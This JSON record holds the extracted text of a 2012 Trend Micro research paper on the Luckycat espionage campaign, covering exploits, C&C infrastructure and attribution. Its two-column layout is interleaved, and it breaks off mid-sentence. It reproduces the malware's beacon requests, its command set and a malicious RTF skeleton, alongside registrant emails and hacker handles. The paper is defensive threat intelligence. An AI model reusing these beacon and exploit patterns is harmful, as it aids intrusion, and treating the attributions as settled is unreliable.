{
    "id": "bac10f70-2877-4363-b218-148d2197df5d",
    "created_at": "2022-10-25T16:48:17.316581Z",
    "updated_at": "2025-03-27T02:05:23.423526Z",
    "deleted_at": null,
    "sha1_hash": "bdb218fdc0cce0bc57f77a9a1e6d3cc7e81b55f9",
    "title": "Luckycat Redux: Inside An Apt Campaign With Multiple Targets  In India And Japan",
    "authors": "Trend Micro",
    "file_creation_date": "2012-03-28T14:30:38Z",
    "file_modification_date": "2012-03-29T12:58:04Z",
    "file_size": 2115267,
    "plain_text": "##### Trend Micro\n Research Paper\n 2012\n\n LUCKYCAT REDUX\n# Inside an APT Campaign with Multiple Targets in India and Japan\n\n###### By: Forward-Looking Threat Research Team\n\n\n-----\n\n#### CONTENTS\n\nIntroduction..................................................................................... 1 Attribution.......................................................................................11\n\nDiversity of Targets................................................................. 1 Campaign Connections................................................................12\nDiversity of Malware.............................................................. 2 ShadowNet..............................................................................12\nDiversity of Infrastructure.................................................... 2 Duojeen....................................................................................13\nOperations............................................................................... 2 Sparksrv..................................................................................15\nAttribution............................................................................... 2 Comfoo.....................................................................................16\nLuckycat........................................................................................... 3 Conclusion......................................................................................19\n\nExamples of Luckycat Attacks.............................................4 Defending Against APTs..............................................................19\n\nExample 1: Japan.............................................................4 Local and External Threat Intelligence ...........................19\nExample 2: India..............................................................4 Mitigation and Cleanup Strategy......................................20\nExample 3: Tibet..............................................................5 Educating Employees Against Social Engineering.......20\nVulnerabilities and Malware Samples.......................................5 Data-Centric Protection Strategy.....................................20\nCampaign Codes............................................................................ 7 Trend Micro Threat Protection Against Luckycat\nCommand and Control..................................................................8 Campaign Components...............................................................21\nOperations.......................................................................................9\n\n\n-----\n\n#### INTRODUCTION\n\nThe number of targeted attacks has dramatically Cyber-espionage campaigns often focus on specific\nincreased. Unlike largely indiscriminate attacks that focus industries or communities of interest in addition to a\non stealing credit card and banking information associated geographic focus. Different positions of visibility often\nwith cybercrime, targeted attacks noticeably differ and yield additional sets of targets pursued by the same threat\nare better characterized as “cyber espionage.” Highly actors. We have been tracking the campaign dubbed\ntargeted attacks are computer intrusions threat actors “Luckycat” and found that in addition to targeting Indian\nstage in order to aggressively pursue and compromise military research institutions, as previously revealed by\nspecific targets, often leveraging social engineering, in Symantec, the same campaign targeted entities in Japan\norder to maintain persistent presence within the victim’s as well as the Tibetan community.[3]\nnetwork so they can move laterally and extract sensitive\ninformation.[1] The Luckycat campaign targeted the following industries\n\nand/or communities:\n\nIn a typical targeted attack, a target receives a\ncontextually relevant email that encourages a potential     - Aerospace     - Shipping\nvictim to click a link or open a file.[2] The links and files\nthe attackers send contain malicious code that exploits     - Energy     - Military research\nvulnerabilities in popular software. The exploits’ payload\nis a malware that is silently executed on the target’s     - Engineering     - Tibetan activists\ncomputer. This exploitation allows the attackers to\ntake control of and obtain data from the compromised The Luckycat campaign attacked a diverse set of targets\ncomputer. In other cases, the attackers send disguised using a variety of malware, some of which have been\nexecutable files, usually compressed in archives that, linked to other cyber-espionage campaigns. The attackers\nif opened, also compromise the target’s computer. The behind this campaign maintain a diverse set of C&C\nmalware connects back to command-and-control (C&C) infrastructure and leverages anonymity tools to obfuscate\nservers under the attackers’ control from which they their operations. We were able to track elements of this\ncan command the compromised computer to download campaign to hackers based in China.\nadditional malware and tools that allow them to move\nlaterally throughout the target’s network. These attacks\n\n##### Diversity of Targets\n\nare, however, not isolated “smash-and-grab” incidents but\nare part of consistent campaigns that aim to establish\ncovert presence in a target’s network so that information The Luckycat campaign, which has been active since at\ncan be extracted as needed. least June 2011, has been linked to 90 attacks against\n\ntargets in Japan and India as well as Tibetan activists.\n\nTargeted attacks are rarely isolated events. In fact, Each malware attack involves a unique campaign code that\nthey are constant. It is more useful to think of them as can be used to track which victims were compromised by\ncampaigns—a series of failed and successful attempts which malware attack. This illustrates that the attackers\nto compromise a target’s network over a certain period are both very aggressive and continually target their\nof time. The attackers, in fact, often keep track of the intended victims. These are not smash-and-grab attacks\ndifferent attacks within a campaign in order to determine but constitute a “campaign” comprising a series of\nwhich individual attack compromised a specific victim’s ongoing attacks over time. In sum, the Luckycat campaign\nnetwork. As the attackers learn more about their targets managed to compromise 233 computers.[4]\nfrom open source research—relying on publicly available\ninformation, as well as previous attacks, the specificity of\nthe attacks may sharply increase.\n\n1 [http://www.trendmicro.com/cloud-content/us/pdfs/security-](http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_trends-in-targeted-attacks.pdf) [3 http://www.symantec.com/content/en/us/enterprise/media/security_](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_luckycat_hackers.pdf)\n[intelligence/white-papers/wp_trends-in-targeted-attacks.pdf](http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_trends-in-targeted-attacks.pdf) [response/whitepapers/the_luckycat_hackers.pdf](http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the_luckycat_hackers.pdf)\n\n\n-----\n\n##### Diversity of Malware Operations\n\nWe were able to identify five malware families either TROJ_WIMMIE, favored by the Luckycat attackers, bundles\nutilized by or hosted on the same dedicated server the a significant amount of information on the victim and\nLuckycat campaign uses. Some were used as second- uploads it to a C&C server. One such file recovered from\nstage malware that the attackers pushed to victims whose a C&C server is actually the result of a test run by the\nnetworks were compromised by first-stage malware. attackers. The information reveals that the attackers use\nSecond-stage malware typically provide additional proxy and anonymity tools to shield their identities as\nfunctionality and are especially used if the first-stage well as a variety of mailing programs to instigate targeted\nmalware prove very simplistic. In addition, we found that attacks. In addition, the language settings of the attackers’\nthe attackers used multiple malware families that coincide computers indicate that they are Chinese speakers. This is\nwith malware that have been used in other campaigns. consistent with the information Symantec obtained, which\nThis indicates a level of collaboration across campaigns. shows that the attackers logged in to their C&C server\n\nfrom IP addresses allocated to China.\n\n##### Diversity of Infrastructure\n Attribution\n\nThe Luckycat campaign use free web-hosting services\nthat provide a diversity of domain names as well as IP Using open source research, we were able to connect\naddresses. This distributes the campaign, making it more the email address used to register one of the Luckycat\ndifficult to track. However, the attackers also made use C&C servers to a hacker in the Chinese underground\nof Virtual Private Servers (VPSs) that not only housed community. He uses the nickname, “dang0102,” and has\ntheir primary malware—TROJ_WIMMIE, but others as well.[5] published posts in the famous hacker forum, XFocus,\nThese servers may also act as anchors, as servers on free as well as recruited others to join a research project on\nhosting services are shut down for malicious activity. As a network attack and defense at the Information Security\nresult, the campaign stabilized its infrastructure over time, Institute of the Sichuan University. The hacker, also known\ntransferring victims, often through the use of second- as “scuhkr,” has authored articles related to backdoors and\nstage malware, from free hosting servers to their stable shellcode in a hacking magazine.\ncore of VPSs.\n\n\n-----\n\n#### LUCKYCAT\n\nThe malware used in the Luckycat campaign, detected by The attacker then creates a file with a name that ends in\nTrend Micro as TROJ_WIMMIE[6] or VBS_WIMMIE,[7] connects _@.c, which contains a command._\nto a C&C server via HTTP over port 80. It is notable\nbecause it uses Windows Management Instrumentation [HOSTNAME]_[MAC_ADDRESS]_[CAMPAIGN_\n_(WMI)[8]_ to establish persistence.[9] VBS_WIMMIE registers a CODE]@.c\nscript that works as a backdoor to the WMI event handler\n\nThe compromised computer then downloads the file and\n\nand deletes files associated with it or TROJ_WIMMIE. As\n\nexecutes the specified command, which may include any\n\na result, the backdoor cannot be detected by antivirus\n\nof the following:\n\nsoftware through simple file scanning.\n\n                                                                       - Get external IP address\n\n                                                  - Download file\n\nThe compromised computer posts data to a PHP script\nthat runs on the C&C server, usually count.php.     - Execute shell command\n\n                                                  - Upload file\n\nPOST/count/count.php?m=c&n=[HOSTNAME]_\n\n[MAC_ADDRESS]_[CAMPAIGN_CODE]@HTTP/1.0 The compromised computer then sends the output to the\nAccept: */* C&C server and deletes the command file:\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE POST/count/count.php?m=w&n=[HOST_NAME]_\n7.0; Windows NT 5.1; .NET CLR 2.0.50727; [MAC_ADDRESS]_[CAMPAIGN_CODE]@@.t HTTP/1.0\n.NET CLR 3.0.4506.2152; .NET CLR POST/count/count.php?m=d&n=[HOST_NAME]_\n3.5.30729) [MAC_ADDRESS]_[CAMPAIGN_CODE]@@.c HTTP/1.0\nHost: [HOSTNAME]\nContent-Length: 0 One of the common initial commands instructs the\nConnection: Keep-Alive compromised computer to upload the results of\nPragma: no-cache information-gathering commands. This command causes\n\nthe compromised computer to create a directory listing\n\nThe initial communication results in the creation of a\n\nof the available drives, along with the output of the\n\nfile on the C&C server that contains information on the\n\ncommands, “ipconfig,” “tasklist,” and “systeminfo.” The\n\ncompromised computer. Although the file is empty, the\n\nresulting files are compressed using the CAB compression\n\nfile name contains the hostname of the compromised\n\nformat and uploaded to the C&C server. This provides the\n\ncomputer, followed by its MAC address, along with the\n\nattackers a full set of information to evaluate the nature of\n\ncampaign code the attackers use to identify which\n\nthe compromised computer.\n\nmalware attack caused the compromise:\n\n~[HOSTNAME]_[MAC_ADDRESS]_[CAMPAIGN_CODE]\n\n[6 http://about-threats.trendmicro.com/Malware.](http://about-threats.trendmicro.com/Malware.aspx?language=us&name=TROJ_WIMMIE.C)\n\n[aspx?language=us&name=TROJ_WIMMIE.C](http://about-threats.trendmicro.com/Malware.aspx?language=us&name=TROJ_WIMMIE.C)\n[7 http://about-threats.trendmicro.com/malware.](http://about-threats.trendmicro.com/malware.aspx?language=us&name=VBS_WIMMIE.C)\n\n[aspx?language=us&name=VBS_WIMMIE.C](http://about-threats.trendmicro.com/malware.aspx?language=us&name=VBS_WIMMIE.C)\n8 The Luckycat malware may be notable but its technique is no longer\n\nnew, as the WMI malware featured in the paper cited below also\nexhibited the same capability.\n\n\n-----\n\n##### Examples of Luckycat Attacks\n\n###### Example 1: Japan Example 2: India\n\n_Figure 1: Decoy document opened after exploiting an Adobe_\n\nReader vulnerability\n\nA targeted email was sent to some organizations in Japan.\nOne of the attacks occurred during the confusion after _Figure 2: Redacted decoy document opened after exploiting a_\n\nMicrosoft Word vulnerability\n\nthe Great East Japan Earthquake and the Fukushima\nNuclear Power Plant accident. The attackers used the\n\nA malicious document containing information on India’s\n\ndisaster to lure potential victims into opening a malicious\n\nballistic missile defense program was used to lure potential\n\n.PDF attachment. The .PDF file exploited a vulnerability\n\nvictims into opening it. This document contains malicious\n\nin Adobe Reader—CVE-2010-2883, in order to drop\n\ncode that exploits a vulnerability in Microsoft Office—CVE-\n\nTROJ_WIMMIE onto the target’s system.[10] This malware\n\n_2010-3333, to drop TROJ_WIMMIE onto a compromised_\n\ncommunicated with a Luckycat C&C server. The decoy\n\nsystem so this would connect to a C&C server the Luckycat\n\ndocument contains the radiation dose measurement\n\nhackers operate.[12]\n\nresults, which were published on the Tokyo Power Electric\nCompany (TEPCO) website.[11]\n\n\n-----\n\n#### VULNERABILITIES AND MALWARE SAMPLES\n\n###### Example 3: Tibet\n\nMost of the samples we have seen exploited CVE-2010-\n_3333. Dubbed the “Rich Text Format (RTF) Stack Buffer_\nOverflow Vulnerability,” this causes a buffer overflow in\nthe Microsoft Word RTF parser when the “pFragments”\nshape property is given a malformed value.\n\nTo verify the exploitation, one should look out for the\nfollowing keywords:\n\n                                                  - pFragments: Seen after the string, “\\sn”\n\n                                                  - \\sv: Exploit code is seen after this\n\nThe typical structure of the malicious RTF document is:\n\n{\\rtf1{\\shp{\\sp{\\sn pFragments}{\\sv\n\n_Figure 3: Decoy document opened after exploiting a Microsoft_ “exploit code”}}}}\n\nOffice vulnerability\n\nThe rest of the samples we found exploited the following\n\nMalicious emails and .DOC attachments that leverage vulnerabilities in Adobe Reader and Flash Player:\nTibetan themes in order to trick recipients into opening\nthem have been found. This particular sample exploits the _•_ _CVE-2010-2883: Adobe Reader TTF SING table_\nsame vulnerability in Microsoft Office—CVE-2010-3333, to parsing vulnerability\ndrop TROJ_WIMMIE onto the target’s system so it would\ncommunicate back to a C&C server the Luckycat hackers _•_ _CVE-2010-3654: Adobe Flash Player AVM2 multi-name_\noperate. button class vulnerability[13]\n\n_•_ _CVE-2011-0611: Adobe Flash Player AVM1 shared object_\n\ntype vulnerability[14]\n\n_•_ _CVE-2011-2462: Adobe Reader U3D component_\n\nvulnerability[15]\n\n[13 http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3654](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3654)\n\n\n-----\n\n|MD5|CVE Identifier|Campaign Code|\n|---|---|---|\n|dab3f591b37f5147ae92570323b5c47d|CVE-2010-3333|w1229|\n|c023544af85edacc66cd577a0d665dec|CVE-2010-3333|w1229|\n|cff0964ed2df5659b0a563f32b7c3eca|CVE-2010-3333|214|\n|3deb2a5fcb6bf1f80a074fd351e6f620|CVE-2010-3333|2012|\n|1aa1e795a5ba75f2a5862c6d01205b57|CVE-2010-2883 CVE-2010-3654 CVE-2011-0611|110824p|\n|6a62d4532c7a0656381fee8fb51874d7|CVE-2010-2883 CVE-2010-3654 CVE-2011-0611|longjiao|\n|cb9ab22f3356a3b054a7e9282a69f71e|CVE-2011-2462|gop|\n|1dafdc9e507771d0d8887348ce3f1c52|CVE-2010-3333|gop|\n|039a6e012f33495a1308b815ef098459|CVE-2010-3333|luck|\n|be0b2e7a53b1dcacb8c54c180dc4ca27|CVE-2010-2883 CVE-2010-3654 CVE-2011-0611|11727p|\n|00f07b0e701dcfa49e1c907f9242d028|CVE-2010-2883 CVE-2010-3654 CVE-2011-0611|110705hktq|\n|411ab5eb2ef3153b61a49964f9ab4e64|CVE-2011-2462|1229|\n|dcac508495d9800e476aa0c8e11b748d|CVE-2010-3333|2012|\n|00e686e382806c33d9ae77256f33ed93|Not applicable|LY|\n\n\nMD5 CVE Identifier Campaign Code\n\ndab3f591b37f5147ae92570323b5c47d _CVE-2010-3333_ w1229\n\nc023544af85edacc66cd577a0d665dec _CVE-2010-3333_ w1229\n\ncff0964ed2df5659b0a563f32b7c3eca _CVE-2010-3333_ 214\n\n3deb2a5fcb6bf1f80a074fd351e6f620 _CVE-2010-3333_ 2012\n\n1aa1e795a5ba75f2a5862c6d01205b57 _CVE-2010-2883_ 110824p\n_CVE-2010-3654_\n_CVE-2011-0611_\n\n6a62d4532c7a0656381fee8fb51874d7 _CVE-2010-2883_ longjiao\n_CVE-2010-3654_\n_CVE-2011-0611_\n\ncb9ab22f3356a3b054a7e9282a69f71e _CVE-2011-2462_ gop\n\n1dafdc9e507771d0d8887348ce3f1c52 _CVE-2010-3333_ gop\n\n039a6e012f33495a1308b815ef098459 _CVE-2010-3333_ luck\n\nbe0b2e7a53b1dcacb8c54c180dc4ca27 _CVE-2010-2883_ 11727p\n_CVE-2010-3654_\n_CVE-2011-0611_\n\n00f07b0e701dcfa49e1c907f9242d028 _CVE-2010-2883_ 110705hktq\n_CVE-2010-3654_\n_CVE-2011-0611_\n\n411ab5eb2ef3153b61a49964f9ab4e64 _CVE-2011-2462_ 1229\n\ndcac508495d9800e476aa0c8e11b748d _CVE-2010-3333_ 2012\n\n00e686e382806c33d9ae77256f33ed93 Not applicable LY\n\n_Table 1: Luckycat malware samples sorted by exploit and campaign code_\n\n\n-----\n\n#### CAMPAIGN CODES\n\nEach malware attack involves a unique campaign code that     - 110714jdap     - 64sc109pfye\ncan be used to track which systems were compromised by\nwhich attack. The campaign codes often contain dates that     - 110714tp     - 64sc239pf9010\nindicate when each malware attack was launched. This\ndemonstrates how actively and frequently the attackers     - 110715x     - 720halheli\nlaunched attacks. The campaign codes also reveal the\nattackers’ intent, as some of these referenced the intended     - 110718p     - 729ggggsenior\ntargets. The following lists the campaign codes we\ndiscovered:     - 110816h     - 919ggggstp\n\n       - 0607e       - 1090silver89       - 110824p       - ggggstpdomainserver\n\n       - 0609af       - 110228cl       - 1108navyeast       - dang279wrdye\n\n       - 0613deliinfo       - 110311cl       - 1108vpsecretary       - god\n\n       - 0613f       - 110315cl       - 111031pp       - gop\n\n       - 0614senior       - 110315       - 1110mea       - ishan99dfp\n\n       - 0616itiT8       - 110321cl       - 1114round       - j1141ap99\n\n       - 0706gggg       - 110329       - 1122bol       - j4611dq9\n\n       - 0804ggggdatanet1       - 110504       - 1122gmail       - kondulgml27pfye\n\n       - 0805ggggetp       - 110603p89       - 1122other       - longjiao\n\n       - 0805ggggstp       - 110606rg789       - 11421is9       - luck\n\n       - 0805ecil       - 110616np       - 1145j9yb       - LY\n\n       - 0805gggg       - 110705hktq       - 1147s9       - nec3rd79dfp\n\n       - 0818ICG       - 110706gggg       - 1148dq8       - nfounrsvan99uc\n\n       - 0823ggggARDE       - 110706hal       - 11614lmpn       - nne\n\n       - 0824ggg       - 110705hktq       - 11725imp       - ongs239pfye\n\n       - 0826ggggtnd       - 110708hktqw       - 11727p       - sai\n\n       - 1017navydiwali       - 110711gggg       - 1229       - stmlsp211wd\n\n       - 1017ggg       - 110711hal       - 2012       - w1229\n\n       - 1025gggCSC       - 110711xzg       - 214       - wwwroot\n\n      - 1025 SC      - 110713jp\n\n\n-----\n\n|Domain|Email Address|\n|---|---|\n|clbest.greenglassint.net|19013788@qq.com|\n|bailianlan.c.dwyu.com|dayinok@qq.com|\n|duojee.info|duojeewei@qq.com|\n\n|Domain|Email Address|\n|---|---|\n|cattree.1x.biz|lindagreen56@rediffmail.com|\n|charlesbrain.shop.co|yamagami_2011@mail.goo. ne.jp|\n|footballworldcup.website.org|ajayalpna@hotmail.com|\n|frankwhales.shop.co|yamagami_2011@mail.goo. ne.jp|\n|hi21222325.x.gg|hi2122325@hotmail.com|\n|kinkeechow.shop.co|kinkee_chow@mail.goo.ne.jp|\n|kittyshop.kilu.org|pbdelhioffice@gmail.com|\n|perfect.shop.co|dsang72@yahoo.com|\n|pumasports.website.org|ranjitrai123@hotmail.com|\n|tomsburs.shop.co|yamagami_2011@mail.goo. ne.jp|\n|vpoasport.shopping2000.com|beenznair@gmail.com|\n|goodwell.all.co.uk|paltry.parrot@googlemail.com|\n|fireequipment.website.org|shrivastava.agrim@gmail.com|\n|tennissport.website.org|manindramohanshukla@ yahoo.com|\n|waterpool.website.org|jaganacharya@hotmail.com|\n|tb123.xoomsite.com||\n|tbda123.gwchost.com||\n|toms.0fees.net||\n|tomygreen.0fees.net||\n|killmannets.0fees.net||\n|maritimemaster.kilu.org||\n|masterchoice.shop.co||\n|jeepvihecle.shop.co||\n|lucysmith.0fees.net||\n\n\n#### COMMAND AND CONTROL\n\nThe Luckycat campaign extensively use free hosting The attackers also maintain servers that do not appear to\nservices. We recorded the domains the attackers used as be from free web-hosting service providers. In fact, these\nwell as the email addresses they utilized to register the appear to use dedicated VPS services.\ndomains, if available. While the domains, including their\nsuffixes, were considerably diverse, all were available\n\nDomain Email Address\n\nfrom three different free hosting services. As such, the\nattackers had nothing to lose but time in order to continue _clbest.greenglassint.net_ _19013788@qq.com_\ncreating diverse domain names for C&C servers. _bailianlan.c.dwyu.com_ _dayinok@qq.com_\n\n_duojee.info_ _duojeewei@qq.com_\n\nDomain Email Address\n\n_Table 3: C&C servers that the attackers hosted on VPSs_\n\n_cattree.1x.biz_ _lindagreen56@rediffmail.com_\n\n_charlesbrain.shop.co_ _yamagami_2011@mail.goo._ We also found advertisements for VPS services using two\n_ne.jp_\n\nof the C&C server IP addresses in Table 3. While the VPS\n\n_footballworldcup.website.org_ _ajayalpna@hotmail.com_ services were advertised in Chinese forums, the servers\n\n_frankwhales.shop.co_ _yamagami_2011@mail.goo._ were actually hosted in the United States.\n_ne.jp_\n\n_hi21222325.x.gg_ _hi2122325@hotmail.com_\n\n_kinkeechow.shop.co_ _kinkee_chow@mail.goo.ne.jp_\n\n_kittyshop.kilu.org_ _pbdelhioffice@gmail.com_\n\n_perfect.shop.co_ _dsang72@yahoo.com_\n\n_pumasports.website.org_ _ranjitrai123@hotmail.com_\n\n_tomsburs.shop.co_ _yamagami_2011@mail.goo._\n_ne.jp_\n\n_vpoasport.shopping2000.com_ _beenznair@gmail.com_\n\n_goodwell.all.co.uk_ _paltry.parrot@googlemail.com_\n\n_Figure 4: Sample ads for the VPS services the attackers use_\n\n_fireequipment.website.org_ _shrivastava.agrim@gmail.com_\n\n_tennissport.website.org_ _manindramohanshukla@_ The diversity of C&C hosting services used provided\n_yahoo.com_ the attackers a resilient infrastructure. If one server, for\n\n_waterpool.website.org_ _jaganacharya@hotmail.com_ instance, was shut down for malicious activity, they can\n\neasily create more servers. As victims of interest are\n\n_tb123.xoomsite.com_\n\nidentified, they can also be easily moved from free hosting\n\n_tbda123.gwchost.com_\n\nservers to C&C servers set up on more stable VPSs. The\n\n_toms.0fees.net_ domain and geographic diversity of the IP addresses also\n\n_tomygreen.0fees.net_ helped mask the attackers’ locations.\n\n_killmannets.0fees.net_\n\n_maritimemaster.kilu.org_\n\n_masterchoice.shop.co_\n\n_jeepvihecle.shop.co_\n\n_lucysmith.0fees.net_\n\n_Table 2: Free web-hosting service domains the attackers used for_\n\n_C&C servers_\n\n\n-----\n\n#### OPERATIONS\n\nThe threat actors behind the Luckycat campaign tested\none of their malware samples on a computer under\ntheir control. In the process, they uploaded down.cab,\nwhich contains a command that creates a directory\nlisting of the available drives on a compromised system,\nalong with the output of the commands, “ipconfig,”\n“tasklist,” and “systeminfo.” We were able to download\nthis file from the C&C server. While it does not reveal the\nattackers’ identities, it does provide an inside view of their\noperations.\n\nThe result of the “systeminfo” command indicates that the\nattackers tested the malware in a virtual environment. The\nenvironment was set up using a Chinese-language version\nof Windows XP.\n\n_Figure 6: Sample ads for the pirated Windows XP version used_\n\nWhile the rest of the information we gathered did not\nreveal significant clues due to the use of a VM, we found\nthat the attackers left a shared drive—D:\\, which was\nindexed by the malware. The index was then uploaded to\nthe C&C server.\n\n_Figure 5: Sample system information the attackers obtained after_\n\n_testing on a virtual machine (VM)_\n\nWe found that the product ID of the Windows XP software\nused was posted online in the past. It was a pirated\n_Windows XP version that was made available for purchase_\nin China. _Figure 7: Drive left available by the attackers that contains C&C_\n\n_scripts and victim information_\n\n\n-----\n\nIn one of the directories—ccclllmmmm, we found that\nthe attackers put a copy of the count.php C&C backend\nas well as a list of the victims and the contents of their\ncomputers. We were also able to find that the C&C server\nthe attackers used was a victim’s computer.\n\n_Figure 9: Anonymity tools the attackers had on the shared D:\\_\n\n_drive_\n\nThe attackers also had mailing software such as FoxMail\nand Supermailer on the shared D:\\ drive. While these tools\nare not malicious, the attackers used these to easily send\nout socially engineered emails. These also allowed them to\nkeep track of their various identities and email accounts.\nOne of the samples we obtained used the Chinese-\nlanguage version of FoxMail.\n\n_Figure 8: Victim information on the attackers’ C&C server that is_\n_identical to the the information on the attackers’ shared D:\\ drive_ The attackers clearly have operational procedures in place\n\nto obscure their true locations with the aid of anonymity\n\nTo ensure operational security, the attackers installed Tor tools. They also have a virtualized environment set up to\nand Tunnelier. Some of the email samples with malware test and fine-tune their malware as well as the necessary\nattachments, in fact, sent through Yahoo! Mail used Tor. tools to maintain their various identities and send out\nThe use of this anonymity tool allowed the attackers to socially engineered emails with malicious attachments.\nobscure their IP addresses, making it increasingly difficult\nfor researchers to pinpoint their locations.\n\n\n-----\n\n#### ATTRIBUTION\n\nAdditional clues concerning the attackers had to with\nthe email address, 19013788@qq.com, which was used\nto register one of the C&C servers, clbest.greenglassint.\n_net. This email address can be mapped to the QQ number,_\n_19013788. QQ is popular instant-messaging (IM) software in_\nChina. This QQ number is linked to a hacker in the Chinese\nunderground community who goes by the nickname,\n“dang0102,” and has published posts in the famous hacker\nforum, XFocus, in 2005.\n\n_Figure 10: Sample post by dang0102 using the QQ number,_\n\n_Figure 11: Post by schuhkr using the QQ number, 19013788_\n\n19013788\n\nThe post in Figure 11 contains two email addresses—\n\nThe same hacker also published a post on a student BBS\n\nggggggsccd@sina.com and scuhkr@21cn.com, along\n\nof the Sichuan University using the nickname, “scuhkr,”\n\nwith an additional QQ number, 2888111. The email address,\n\nin 2005. He wanted to recruit 2–4 students to a network\n\n_scuhkr@21cn.com, is also associated with an account on_\n\nattack and defense research project at the Information\n\n_rootkit.com.[17]_ Investigating the second QQ number allowed\n\nSecurity Institute of the Sichuan University then. Scuhkr\n\nus to determine that scuhkr also used the nickname,\n\nalso authored articles related to backdoors and shellcode\n\n“lolibaso.” The other individual mentioned in the post also\n\nin a hacking magazine that same year.[16]\n\nworked and studied at the Information Security Institute of\nthe Sichuan University and has published several articles\nrelated to “fuzzing” vulnerabilities in 2006.\n\n\n-----\n\n#### CAMPAIGN CONNECTIONS\n\nWe were able to identify five malware families that were One of the sample email’s attachments was part of\neither used by or hosted on the same dedicated server the Luckycat campaign while the other was part of the\nwith the domain name, duojee.info. Some of these were ShadowNet campaign. The ShadowNet campaign has\nused as second-stage malware that the attackers pushed a history of targeting Tibetan activists as well as the\nto victims whose systems have been compromised by first- Indian government, which fits the profile of the Luckycat\nstage malware. Second-stage malware typically provided campaigns as well.\nadditional functionality and were especially used if the\nfirst-stage malware is very simplistic. We also found that\nthe attackers used several malware families that have\nbeen utilized in previous campaigns. This may indicate a\nlevel of collaboration across campaigns.\n\n##### ShadowNet\n\nThe first interesting connection we noticed in conjunction\nwith the Luckycat campaign had to do with ShadowNet,\na cyber-espionage network documented by researchers\nat the University of Toronto and the ShadowServer\nFoundation.[18] We found a socially engineered email that\nhad two malicious file attachments.\n\n_Figure 13: Relationship between the Luckycat and the ShadowNet_\n\n_campaigns_\n\nThe ShadowNet malware, detected by Trend Micro as\nTROJ_GUPD.AB, first connects to a blog in order to receive\nthe URL of the C&C server. The URL was encoded using\na modulus operation. The malware on the compromised\ncomputer decodes the URL then issues a connection to\nthe C&C server. The compromised computer posts data to\na PHP script running on the server, usually named index.\n_php or all.php, and contains information about it as well as_\na campaign code.\n\nThe information is stored in a .TXT file on the C&C server.\nThe compromised computer continues to beacon to the\nC&C server to see if the operators have designed any\ncommands. If they have, the compromised computer then\nexecutes the given commands and reports the results back\nto the C&C server.\n\n_Figure 12: Sample targeted email with both Luckycat and_\n\n_ShadowNet malware attachments_\n\n\n-----\n\n|MD5|CVE Identifier|Campaign Code|\n|---|---|---|\n|26891c3e4a2de034e4841db2a579734f|CVE-2011-2462|circle|\n|ebea24fe1611a1ab778f5ecceb781fad|CVE-2010-3333|circle|\n\n\n_Figure 15: Example of a blog used by ShadowNet to communicate_\n\n_an encoded C&C server location_\n\n_Figure 14: Sample ShadowNet malware related to a Luckycat_ The blogs and groups the ShadowNet attackers use can\n\n_email attack_ be easily updated whenever the C&C servers are changed.\n\nThe URL of the blog is embedded in the malware. The\n\nThis attack used the theme of self-immolation in Tibet for malware connects to the blog and decodes the C&C URL\nboth the email and the decoy document that is opened then connects to the C&C server. The commands the\nafter the vulnerability exploitation. The malicious file server issues are also encoded using a simple logical\nattachment exploits a vulnerability in Microsoft Office— operator. The malware also decodes these using keycodes\n_CVE-2010-3333, to drop malware onto the target’s system._ that are sent along with the actual commands.\nThe malware was configured to connect to two blogs and a\n_Yahoo! Group in order to find the C&C server’s location._\n\nMD5 CVE Identifier Campaign Code\n\n26891c3e4a2de034e4841db2a579734f _CVE-2011-2462_ circle\n\nebea24fe1611a1ab778f5ecceb781fad _CVE-2010-3333_ circle\n\n_Table 4: ShadowNet malware samples related to the Luckycat campaign_\n\n##### Duojeen\n\nThe malware attacks related to the Duojeen campaign all target the Tibetan community and use a single C&C server—\n_duojee.info. We also found that a malware binary available for download from duojee.info is a TROJ_WIMMIE Trojan that_\nconnects back to bailianlan.c.dwyu.com—a C&C server the Luckycat attackers use.\n\n\n-----\n\n_Figure 16: Relationship between the Duojeen and the Luckycat campaigns_\n\nThe duojee.info server is the C&C component of the The Duojeen malware continues to poll the C&C server\nDuojeen campaign. The related malware, detected by then executes one of the only possible commands\nTrend Micro as BKDR_DUOJEEN.A, connects to a C&C specified by the attackers:\nserver and posts data to a PHP script typically named,\n_linux.php, solaris.php, or freebsd.php. The following_     - Stop the malware from communicating with the C&C\ninformation is encoded using logical operators such as xor, server\n_or, or bitwise shifting on adjacent bytes in the malware:_\n\n                                                  - Download and execute a second-stage malware\n\n       - Hostname\n\n       - Computer name\n\n       - MAC address\n\n       - IP address, subnet mask, and gateway\n\n       - Network resources\n\n       - Running processes\n\n_•_ _Microsoft Outlook user account information (e.g., HTTP_\n\n_Figure 17: Sample Duojeen attack email_\n\nmail user name, POP3 user name, or POP3 server)\n\n       - Recently opened files\n\n\n-----\n\n|MD5|CVE Identifier|Campaign Code|\n|---|---|---|\n|715cbbe21844bbb4f1f60a91ae28def3|CVE-2010-3333|aaaa|\n|a9bda3c31fc6acc83a5226226f7ab554|CVE-2010-3333|aaaa|\n|567a774cf865b50189e81c14b4ca4b63|CVE-2010-3333|aaaa|\n|e62c115b6874726c309b3038a9391e28|CVE-2010-3333|aaaa|\n|9860d087892fce98e6f639e3e9dba91e|Not applicable|aaa|\n|d773e3bacc2c8389c2ab51c9cbc68480|Not applicable|aaa|\n\n\nOne of the Duojeen attacks leverages a Tibetan-themed job ad to encourage potential victims to open an attached\ndocument that exploits a vulnerability in Microsoft Office—CVE-2010-3333, in order to drop a malware that connects to\n_duojee.info._\n\nMD5 CVE Identifier Campaign Code\n\n715cbbe21844bbb4f1f60a91ae28def3 _CVE-2010-3333_ aaaa\n\na9bda3c31fc6acc83a5226226f7ab554 _CVE-2010-3333_ aaaa\n\n567a774cf865b50189e81c14b4ca4b63 _CVE-2010-3333_ aaaa\n\ne62c115b6874726c309b3038a9391e28 _CVE-2010-3333_ aaaa\n\n9860d087892fce98e6f639e3e9dba91e Not applicable aaa\n\nd773e3bacc2c8389c2ab51c9cbc68480 Not applicable aaa\n\n_Table 5: Duojeen malware samples_\n\n_Duojee.info also contains the PHP scripts used for_\ncommanding and controlling the Luckycat campaign at\n_/holly/count.php as well as ShadowNet at /soom/cont.php._\nThe duojee.info server also has a phishing page designed\nto steal passwords from 